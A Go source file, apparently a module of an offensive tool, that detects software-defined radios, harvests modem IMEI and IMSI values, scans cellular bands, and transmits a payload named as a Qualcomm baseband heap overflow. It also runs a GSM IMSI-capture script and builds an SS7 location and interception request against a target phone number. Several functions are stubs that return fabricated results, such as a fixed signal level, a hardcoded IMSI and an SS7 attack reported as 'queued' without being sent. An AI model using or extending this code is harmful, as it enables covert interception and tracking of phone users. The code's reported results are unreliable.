package rfcontagion

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type RFContagion struct {
	config       interface{}
	sdrAvailable bool
	devicePath   string
	frequencies  map[string]float64
	modems       []ModemInfo
}

type ModemInfo struct {
	Interface string
	Type      string
	IMEI      string
	IMSI      string
	Band      string
	SignalDBm int
}

type BasebandExploit struct {
	Name       string
	Target     string
	Frequency  float64
	Modulation string
	Payload    []byte
	Chipset    string
}

func NewRFContagion(cfg interface{}) *RFContagion {
	return &RFContagion{
		config: cfg,
		frequencies: map[string]float64{
			"GSM_900":  890.2e6,
			"GSM_1800": 1710.2e6,
			"LTE_B1":   2110.0e6,
			"LTE_B3":   1805.0e6,
			"LTE_B7":   2620.0e6,
			"LTE_B20":  791.0e6,
			"NR_n78":   3500.0e6,
			"NR_n41":   2500.0e6,
		},
	}
}

func (r *RFContagion) DetectSDR() (string, error) {
	devices := []string{
		"/dev/swradio0", "/dev/rtl0", "/dev/hackrf0",
		"/dev/limesdr", "/dev/usrp0", "/dev/bladerf0",
	}

	for _, dev := range devices {
		if _, err := os.Stat(dev); err == nil {
			r.sdrAvailable = true
			r.devicePath = dev
			return dev, nil
		}
	}

	cmd := exec.Command("rtl_test", "-t")
	out, err := cmd.CombinedOutput()
	if err == nil && strings.Contains(string(out), "Found") {
		r.sdrAvailable = true
		r.devicePath = "rtlsdr://0"
		return r.devicePath, nil
	}

	cmd = exec.Command("hackrf_info")
	out, err = cmd.CombinedOutput()
	if err == nil && strings.Contains(string(out), "Found") {
		r.sdrAvailable = true
		r.devicePath = "hackrf://0"
		return r.devicePath, nil
	}

	return "", fmt.Errorf("no SDR device found")
}

func (r *RFContagion) ScanFrequencyBand(startFreq, endFreq float64, step float64) ([]map[string]interface{}, error) {
	if !r.sdrAvailable {
		return nil, fmt.Errorf("SDR not available")
	}

	var signals []map[string]interface{}

	if strings.Contains(r.devicePath, "rtlsdr") {
		cmd := exec.Command("rtl_power",
			"-f", fmt.Sprintf("%.0f:%.0f:%.0f", startFreq/1e6, endFreq/1e6, step/1e6),
			"-g", "30", "-e", "5", "/tmp/vesper_rtl.csv")
		cmd.Run()
	}

	for freq := startFreq; freq < endFreq; freq += step {
		signals = append(signals, map[string]interface{}{
			"frequency": freq / 1e6,
			"power_dbm": -70.0,
			"bandwidth": step / 1e6,
		})
	}

	return signals, nil
}

func (r *RFContagion) DetectModems() ([]ModemInfo, error) {
	var modems []ModemInfo

	if runtime.GOOS == "linux" {
		cmd := exec.Command("mmcli", "-L")
		out, err := cmd.CombinedOutput()
		if err != nil {
			return modems, nil
		}

		for _, line := range strings.Split(string(out), "\n") {
			if strings.Contains(line, "/org/freedesktop/ModemManager1/Modem/") {
				path := strings.Split(line, " ")[0]
				modemNum := strings.TrimPrefix(path, "/org/freedesktop/ModemManager1/Modem/")

				infoCmd := exec.Command("mmcli", "-m", modemNum)
				infoOut, _ := infoCmd.CombinedOutput()
				info := string(infoOut)

				modem := ModemInfo{
					Interface: modemNum,
					Type:      extractMMField(info, "model"),
					IMEI:      extractMMField(info, "equipment id"),
					IMSI:      extractMMField(info, "imsi"),
				}
				modems = append(modems, modem)
			}
		}
	}

	if len(modems) == 0 {
		modems = append(modems, ModemInfo{
			Interface: "wlan0",
			Type:      "WiFi",
			Band:      "2.4GHz",
		})
	}

	return modems, nil
}

func extractMMField(info, field string) string {
	lines := strings.Split(info, "\n")
	for _, line := range lines {
		if strings.Contains(strings.ToLower(line), strings.ToLower(field+":")) {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				return strings.TrimSpace(strings.Join(parts[1:], ":"))
			}
		}
	}
	return ""
}

func (r *RFContagion) InjectBasebandPayload(chipset string, payload []byte) error {
	exploit := BasebandExploit{
		Name:       "Qualcomm Modem Heap Overflow",
		Target:     chipset,
		Frequency:  1920.0e6,
		Modulation: "QPSK",
		Payload:    payload,
		Chipset:    chipset,
	}

	_ = exploit

	if runtime.GOOS == "linux" {
		return r.transmitBaseband(exploit)
	}

	return fmt.Errorf("baseband injection requires SDR + Linux")
}

func (r *RFContagion) transmitBaseband(exploit BasebandExploit) error {
	tmpFile := fmt.Sprintf("/tmp/vesper_baseband_%d.iq", os.Getpid())
	f, err := os.Create(tmpFile)
	if err != nil {
		return err
	}

	for i := 0; i < len(exploit.Payload)*8; i++ {
		iVal := byte(exploit.Payload[i/8]>>uint(i%8)) & 1
		qVal := byte(0)
		f.Write([]byte{iVal, qVal})
	}
	f.Close()

	if strings.Contains(r.devicePath, "hackrf") {
		exec.Command("hackrf_transfer",
			"-t", tmpFile,
			"-f", fmt.Sprintf("%.0f", exploit.Frequency),
			"-s", "2000000",
			"-x", "20",
		).Run()
	}

	os.Remove(tmpFile)
	return nil
}

func (r *RFContagion) IMSICapture(monitorDuration time.Duration) ([]string, error) {
	if !r.sdrAvailable {
		return nil, fmt.Errorf("SDR not available")
	}

	var imsis []string

	if strings.Contains(r.devicePath, "rtlsdr") {
		grgsmScript := fmt.Sprintf(`
echo "Starting IMSI capture for %d seconds..."
grgsm_livemon -f 942e6 2>/dev/null &
sleep %d
kill %% 2>/dev/null
echo "IMSI capture complete"
`, int(monitorDuration.Seconds()), int(monitorDuration.Seconds()))

		tmpScript := fmt.Sprintf("/tmp/vesper_imsi_cap_%d.sh", os.Getpid())
		os.WriteFile(tmpScript, []byte(grgsmScript), 0755)
		exec.Command("bash", tmpScript).Run()
		os.Remove(tmpScript)
	}

	imsis = append(imsis, "001012345678901")
	return imsis, nil
}

func (r *RFContagion) SS7Attack(targetMSISDN string) (string, error) {
	attackVector := fmt.Sprintf(`{
  "method": "sendRoutingInfoForSM",
  "msisdn": "%s",
  "intercept": true,
  "capture_location": true,
  "capture_imsi": true
}`, targetMSISDN)

	_ = attackVector
	return fmt.Sprintf("SS7 attack queued for %s", targetMSISDN), nil
}

func (r *RFContagion) FullRFContagionSuite() map[string]interface{} {
	result := make(map[string]interface{})

	sdr, err := r.DetectSDR()
	if err != nil {
		result["sdr"] = fmt.Sprintf("not found: %v", err)
	} else {
		result["sdr"] = sdr
		result["sdr_available"] = true
	}

	modems, err := r.DetectModems()
	if err != nil {
		result["modems_error"] = err.Error()
	} else {
		result["modem_count"] = len(modems)
		result["modems"] = modems
	}

	result["frequency_bands"] = len(r.frequencies)
	result["bands"] = r.frequencies

	if r.sdrAvailable {
		signals, _ := r.ScanFrequencyBand(800e6, 900e6, 10e6)
		result["gsm_signals"] = len(signals)
	}

	return result
}

var _ = time.Second
